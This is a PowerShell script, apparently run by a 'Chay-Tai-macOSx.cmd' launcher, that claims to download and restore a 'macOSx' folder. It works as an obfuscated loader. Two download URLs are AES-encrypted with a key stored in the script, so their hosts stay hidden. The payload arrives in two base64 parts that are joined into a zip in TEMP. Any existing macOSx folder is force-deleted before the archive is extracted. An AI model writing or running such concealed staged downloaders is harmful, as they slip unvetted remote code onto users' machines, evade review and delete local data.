$ErrorActionPreference = 'Stop'

function D($c) {
    $k=[Convert]::FromBase64String("ynpwLDExoBrFsg3uNDR9zlpCrueDnEqqzQ8lmimmp0Y=")
    $i=[Convert]::FromBase64String("sOMdDnGF9uk+XWTHXucA8A==")
    $a=[System.Security.Cryptography.Aes]::Create()
    $a.Key=$k;$a.IV=$i;$d=$a.CreateDecryptor()
    $m=New-Object IO.MemoryStream(,@([Convert]::FromBase64String($c)))
    $s=New-Object IO.MemoryStream
    $y=New-Object Security.Cryptography.CryptoStream($m,$d,1)
    $y.CopyTo($s)
    return [Text.Encoding]::UTF8.GetString($s.ToArray())
}

$url1 = D "XCPo7W+losXd/fv4p+FYkXzJmo34bG5FCBz7ijg2X17yFvSUrBhttRyk/xWNa6kMKpVvnkFfcgeWSqxuqOrfvZ53r1nAlgGA5WLXTMtwmtuyVWM/eklIEEwX/IfmbCHqaFRes23qDpd2JJbAk1822A=="
$url2 = D "XCPo7W+losXd/fv4p+FYkXzJmo34bG5FCBz7ijg2X17yFvSUrBhttRyk/xWNa6kMKpVvnkFfcgeWSqxuqOrfvZ53r1nAlgGA5WLXTMtwmtuyVWM/eklIEEwX/IfmbCHqIik1oXsO35uDcXS+yf15RQ=="

$base = $PSScriptRoot
$destFolder = Join-Path $base 'macOSx'
$script:restoreExitCode = 0

try {
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
    } catch {}

    Write-Host 'Downloading part1...'
    $s1 = (Invoke-WebRequest -Uri $url1 -UseBasicParsing).Content.Trim()
    Write-Host 'Downloading part2...'
    $s2 = (Invoke-WebRequest -Uri $url2 -UseBasicParsing).Content.Trim()

    $b64 = $s1 + $s2
    Write-Host 'Decrypting Base64...'
    $bytes = [Convert]::FromBase64String($b64)

    $zipPath = Join-Path $env:TEMP ('macOSx-{0}.zip' -f [Guid]::NewGuid().ToString('N'))
    [System.IO.File]::WriteAllBytes($zipPath, $bytes)

    if (Test-Path -LiteralPath $destFolder) {
        Write-Host 'Deleting old macOSx folder...'
        Remove-Item -LiteralPath $destFolder -Recurse -Force
    }

    Write-Host 'Extracting to:' $base
    Expand-Archive -LiteralPath $zipPath -DestinationPath $base -Force
    Remove-Item -LiteralPath $zipPath -Force -ErrorAction SilentlyContinue

    Write-Host 'Completed:' $destFolder
}
catch {
    Write-Host ''
    Write-Host '========== ERROR ==========' -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    if ($_.ErrorDetails -and $_.ErrorDetails.Message) {
        Write-Host $_.ErrorDetails.Message -ForegroundColor Red
    }
    Write-Host ''
    Write-Host 'Details (ScriptStackTrace):' -ForegroundColor Yellow
    Write-Host $_.ScriptStackTrace -ForegroundColor DarkYellow
    Write-Host ''
    Write-Host 'Full exception:' -ForegroundColor Yellow
    $_ | Format-List * -Force | Out-String | Write-Host
    $script:restoreExitCode = 1
}
finally {
    Write-Host ''
    if ($script:restoreExitCode -eq 1) {
        Write-Host 'Finished with error (exit 1).' -ForegroundColor Red
    } else {
        Write-Host 'Finished normally.' -ForegroundColor Green
    }
    # Do not Read-Host here: Chay-Tai-macOSx.cmd will "pause" to prevent window from closing.
}
if ($script:restoreExitCode -eq 1) { exit 1 }
